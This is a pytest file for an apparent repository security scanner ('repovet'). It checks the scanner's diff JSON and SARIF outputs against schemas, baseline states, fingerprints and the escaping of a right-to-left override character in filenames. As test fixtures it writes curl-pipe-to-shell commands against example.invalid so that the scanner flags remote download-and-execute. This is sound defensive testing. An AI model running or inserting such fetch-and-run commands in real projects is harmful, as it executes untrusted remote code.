"""Diff output schemas and SARIF correlation use the central finding identities."""

import json
from pathlib import Path
from typing import Any

from jsonschema import Draft4Validator, Draft202012Validator

from repovet.cli import main
from test_diff_cli import DOWNLOAD, Capture, diff_json, repository

ROOT = Path(__file__).parent.parent


def test_diff_json_and_nested_scan_reports_validate(tmp_path: Path, capsys: Capture) -> None:
    root, ids = repository(tmp_path, [{"README.md": "DUMMY"}, {"src/a.sh": DOWNLOAD}])
    code, report = diff_json(root, ids[0], capsys)
    assert code == 1
    schema = json.loads((ROOT / "docs/diff.schema.json").read_text(encoding="utf-8"))
    Draft202012Validator.check_schema(schema)
    assert list(Draft202012Validator(schema).iter_errors(report)) == []
    scan_schema = json.loads((ROOT / "docs/report.schema.json").read_text(encoding="utf-8"))
    for side in ("base", "head"):
        scan = report[side]["report"]
        assert scan["schema_version"] == "1.5"
        assert list(Draft202012Validator(scan_schema).iter_errors(scan)) == []
    assert report["schema_version"] == "1.0"
    assert (
        report["ruleset_digest"]
        == report["base"]["report"]["ruleset_digest"]
        == report["head"]["report"]["ruleset_digest"]
    )
    assert len(report["ruleset_digest"]) == 64
    assert set(report["summary"]) == {
        "new",
        "unchanged",
        "updated",
        "absent",
        "ambiguous",
        "unknown",
    }


def test_sarif_baseline_states_and_fingerprints_match_the_json_delta(
    tmp_path: Path, capsys: Capture
) -> None:
    def command(name: str) -> str:
        return f"curl -s https://example.invalid/{name}.sh | sh\n"

    before = {
        "persist.sh": command("persist"),
        "removed.sh": command("removed"),
        "docs/promote.sh": command("promote"),
    }
    after = {
        "persist.sh": command("persist"),
        "new.sh": command("new"),
        "src/promote.sh": command("promote"),
    }
    root, ids = repository(tmp_path, [before, after])
    _, json_report = diff_json(root, ids[0], capsys)
    assert (
        main(["diff", str(root), "--base", ids[0], "--format", "sarif", "--fail-on", "medium"]) == 1
    )
    sarif = json.loads(capsys.readouterr().out)
    assert sarif["version"] == "2.1.0" and len(sarif["runs"]) == 1
    schema = json.loads(
        (ROOT / "tests/schemas/sarif-schema-2.1.0.json").read_text(encoding="utf-8")
    )
    assert list(Draft4Validator(schema).iter_errors(sarif)) == []
    results: list[dict[str, Any]] = [
        item for item in sarif["runs"][0]["results"] if item["ruleId"] == "RC-DLX-001"
    ]
    assert {item["baselineState"] for item in results} == {"new", "unchanged", "updated", "absent"}
    expected = {
        (change["after"] or change["before"])["fingerprint"]
        for change in json_report["changes"]
        if (change["after"] or change["before"])["rule_id"] == "RC-DLX-001"
    }
    assert {item["partialFingerprints"]["primaryLocationLineHash"] for item in results} == expected


def test_sarif_does_not_mark_unchecked_previous_findings_absent(
    tmp_path: Path, capsys: Capture
) -> None:
    small = '{"scripts":{"prepare":"echo DUMMY"}}\n'
    root, ids = repository(tmp_path, [{"package.json": small}, {"package.json": small + " " * 512}])
    assert (
        main(["diff", str(root), "--base", ids[0], "--format", "sarif", "--max-file-size", "256"])
        == 3
    )
    sarif = json.loads(capsys.readouterr().out)
    for item in sarif["runs"][0].get("results", []):
        if item["ruleId"] == "RC-AUTO-002":
            assert item.get("baselineState") != "absent"


def test_diff_schema_rejects_unknown_status_and_invalid_identity(
    tmp_path: Path, capsys: Capture
) -> None:
    root, ids = repository(tmp_path, [{"README.md": "DUMMY"}, {"src/a.sh": DOWNLOAD}])
    _, report = diff_json(root, ids[0], capsys)
    schema = json.loads((ROOT / "docs/diff.schema.json").read_text(encoding="utf-8"))
    validator = Draft202012Validator(schema)
    wrong_version = report | {"schema_version": "0.0"}
    assert not validator.is_valid(wrong_version)
    wrong_status = json.loads(json.dumps(report))
    wrong_status["changes"][0]["status"] = "fixed"
    assert not validator.is_valid(wrong_status)
    wrong_identity = json.loads(json.dumps(report))
    finding = next(
        change["after"] for change in wrong_identity["changes"] if change["after"] is not None
    )
    finding["fingerprint"] = "not-a-valid-fingerprint"
    assert not validator.is_valid(wrong_identity)
    for side in ("base", "head"):
        assert all("identity_material" not in f for f in report[side]["report"]["findings"])


def test_diff_json_and_sarif_keep_invisible_filename_characters_inert(
    tmp_path: Path, capsys: Capture
) -> None:
    root, ids = repository(tmp_path, [{"README.md": "DUMMY"}, {"src/odd\u202e.sh": DOWNLOAD}])
    for fmt in ("json", "sarif"):
        assert (
            main(["diff", str(root), "--base", ids[0], "--format", fmt, "--fail-on", "medium"]) == 1
        )
        output = capsys.readouterr().out
        assert output.isascii()
        decoded = json.dumps(json.loads(output), ensure_ascii=False)
        assert "\u202e" not in decoded
        assert "%E2%80%AE" in output or "<U+202E>" in output
